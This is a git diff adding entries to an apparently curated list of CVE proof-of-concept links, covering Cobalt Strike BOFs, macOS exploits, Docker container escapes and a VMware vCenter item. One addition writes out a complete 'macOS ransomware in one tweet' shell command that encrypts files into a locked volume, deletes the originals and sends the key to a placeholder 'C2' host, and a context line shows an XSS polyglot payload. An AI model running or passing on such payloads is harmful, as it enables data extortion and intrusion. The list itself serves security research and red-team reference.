@@ -86,6 +86,7 @@ Some CVEs PoCs repos on github or internet.
 - [Half Life 1](https://hackerone.com/reports/832750) - Buffer overflow In hl.exe's launch -game argument allows an attacker to execute arbitrary code locally or from browser
 - [PoC for enabling wdigest to bypass credential guard ](https://gist.github.com/N4kedTurtle/8238f64d18932c7184faa2d0af2f1240)
 - Zerologon exploit Test tool for: [CVE-2020-1472](https://github.com/SecuraBV/CVE-2020-1472/) [paper](https://www.secura.com/blog/zero-logon) [PoC exploit](https://github.com/dirkjanm/CVE-2020-1472/). Another tools: [ze0Dump](https://github.com/bb00/zer0dump), [SharpZeroLogon](https://github.com/nccgroup/nccfsas/) - [From Lares Labs: Defensive Guidance for ZeroLogon](https://www.lares.com/blog/from-lares-labs-defensive-guidance-for-zerologon-cve-2020-1472/), [another exploit](https://github.com/BC-SECURITY/Invoke-ZeroLogon), [A different way of abusing Zerologon (CVE-2020-1472)](https://dirkjanm.io/a-different-way-of-abusing-zerologon/) [ZeroLogon detected by Microsoft Defender for Identity](https://techcommunity.microsoft.com/t5/microsoft-365-defender/zerologon-is-now-detected-by-microsoft-defender-for-identity-cve/ba-p/1734034)
+- [CobaltStrike-BOF](https://github.com/Yaxser/CobaltStrike-BOF): Collection of beacon BOF written to learn windows and cobaltstrike
 
 ## macOS/iOS
 
@@ -108,6 +109,10 @@ Some CVEs PoCs repos on github or internet.
 - [CVE-2020-9934](https://github.com/mattshockl/CVE-2020-9934)
 - [Stealing local files using Safari Web Share API](https://blog.redteam.pl/2020/08/stealing-local-files-using-safari-web.html) [PoC](https://overflow.pl/webshare/poc1.html)
 - xnu local privilege escalation via [os x 10.10.5 kernel local privilege escalation](https://github.com/kpwn/tpwn)
+- [MacOS Ransomware in one tweet](https://twitter.com/lordx64/status/1314614366361264130): 
+  ```sh
+  sh -c 'p=$(head -n 1024 /dev/urandom | strings| grep -o "[[:alnum:]]" | head -n 64| tr -d "\n"); diskutil apfs addVolume disk1 APFS x -passphrase "$p"; rsync -zvh --remove-source-files ~/exfil/* /Volumes/x; diskutil umount x; curl -0 http://C2/"$p"'
+  ```
 
 ## Android
 
@@ -256,9 +261,13 @@ javascript:"/*'/*`/*--><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
   - [CVE-2020-3800](https://starlabs.sg/advisories/20-3800/)
   - [CVE-2020-3801](https://starlabs.sg/advisories/20-3801/)
   - [CVE-2020-10907](https://starlabs.sg/advisories/20-10907/)
+- [The Route to Root: Container Escape Using Kernel Exploitation](https://www.cyberark.com/resources/threat-research-blog/the-route-to-root-container-escape-using-kernel-exploitation)
 - [cve-scanner-exploiting-pocs](https://github.com/gmatuz/cve-scanner-exploiting-pocs): Collection of ideas and specific exploits against Docker CVE scanners
+- [Docker Escape Tool](https://github.com/PercussiveElbow/docker-escape-tool): Tool to test if you're in a Docker container and attempt simple breakouts
 - [AT-TFTP_Long_Filename](https://github.com/Re4son/AT-TFTP_Long_Filename): Exploits a stack buffer overflow in AT-TFTP v1.9, by sending a request (get/write) for an overly long file name.
 - [The Anatomy of a Bug Door: Dissecting Two D-Link Router Authentication Bypasses](https://www.zerodayinitiative.com/blog/2020/9/30/the-anatomy-of-a-bug-door-dissecting-two-d-link-router-authentication-bypasses), CVEs CVE-2020-8863 and CVE-2020-8864. [dsp-w215-hnap](https://github.com/bikerp/dsp-w215-hnap): Tool for reading data from D-Link DSP-W215 Smart Plug 
+- [An Exercise in Practical Container Escapology](https://capsule8.com/blog/practical-container-escape-exercise/)
+- [VMware vCenter 6.5u1](https://twitter.com/ptswarm/status/1316016337550938122)
 
 ## Additions
 
